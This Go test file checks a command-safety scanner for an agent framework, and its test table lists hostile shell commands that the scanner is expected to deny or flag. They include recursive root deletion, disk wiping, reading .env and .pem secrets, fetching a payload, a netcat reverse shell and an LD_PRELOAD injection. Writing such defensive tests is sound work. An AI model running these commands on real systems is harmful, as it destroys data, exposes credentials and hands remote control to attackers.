//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"testing"
)

func scanCmd(t *testing.T, backend Backend, command string) ScanReport {
	t.Helper()
	return NewScanner(nil).Scan(context.Background(), ScanInput{
		ToolName: string(backend),
		Backend:  backend,
		Command:  command,
	})
}

func TestRuleTable(t *testing.T) {
	cases := []struct {
		name     string
		backend  Backend
		command  string
		decision Decision
		rule     string
	}{
		{"rm_rf_root", BackendWorkspaceExec, "rm -rf /", DecisionDeny, RuleDangerousDelete},
		{"rm_r_f_split", BackendWorkspaceExec, "rm -r -f /etc/config", DecisionDeny, RuleDangerousDelete},
		{"dd_device", BackendWorkspaceExec, "dd if=/dev/zero of=/dev/sda", DecisionDeny, RuleDangerousDelete},
		{"read_env", BackendWorkspaceExec, "cat config/.env", DecisionDeny, RuleReadSecret},
		{"read_pem", BackendWorkspaceExec, "cat certs/server.pem", DecisionDeny, RuleReadSecret},
		{"net_ip", BackendWorkspaceExec, "wget http://10.1.2.3/payload", DecisionDeny, RuleNetNonWhitelist},
		{"net_allowed", BackendWorkspaceExec, "curl https://github.com/x", DecisionAllow, RuleNetAllowedDomain},
		{"reverse_shell", BackendWorkspaceExec, "nc -e /bin/sh 10.0.0.1 4444", DecisionDeny, RuleReverseShell},
		{"interp_python_c", BackendWorkspaceExec, "python -c 'print(1)'", DecisionDeny, RuleInterpreterInline},
		{"sudo", BackendHostExec, "sudo systemctl restart nginx", DecisionDeny, RuleHostPrivilege},
		{"nohup_runner", BackendHostExec, "nohup ./server", DecisionDeny, RuleCommandRunner},
		{"tail_f_host", BackendHostExec, "tail -f /var/log/app.log", DecisionAsk, RuleHostLongSession},
		{"go_install", BackendWorkspaceExec, "go install ./cmd/tool", DecisionAsk, RuleDependencyInstall},
		{"denied_cmd", BackendWorkspaceExec, "shutdown now", DecisionDeny, RuleDeniedCommand},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			r := scanCmd(t, c.backend, c.command)
			if r.Decision != c.decision {
				t.Errorf("decision=%s want %s; findings=%+v", r.Decision, c.decision, r.Findings)
			}
			if !hasRule(r, c.rule) {
				t.Errorf("missing rule %q; findings=%+v", c.rule, r.Findings)
			}
		})
	}
}

func TestHostExecBumpsRisk(t *testing.T) {
	ws := scanCmd(t, BackendWorkspaceExec, "tail -f log.txt")
	host := scanCmd(t, BackendHostExec, "tail -f log.txt")
	if riskRank(host.RiskLevel) <= riskRank(ws.RiskLevel) {
		t.Errorf("hostexec risk %s should exceed workspace risk %s", host.RiskLevel, ws.RiskLevel)
	}
}

func TestEnforceAllowlist(t *testing.T) {
	p := DefaultPolicy()
	p.EnforceAllowlist = true
	sc := NewScanner(p)
	r := sc.Scan(context.Background(), ScanInput{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "hexdump file",
	})
	if r.Decision != DecisionAsk || !hasRule(r, RuleNotAllowed) {
		t.Errorf("non-allowlisted command should ask; got %s findings=%+v", r.Decision, r.Findings)
	}
}

func TestEnvMutationFlagged(t *testing.T) {
	sc := NewScanner(nil)
	r := sc.Scan(context.Background(), ScanInput{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go build ./...",
		Env:      map[string]string{"LD_PRELOAD": "/tmp/evil.so"},
	})
	if !hasRule(r, RuleEnvMutation) || r.Decision != DecisionAsk {
		t.Errorf("LD_PRELOAD override should ask; got %s findings=%+v", r.Decision, r.Findings)
	}
}
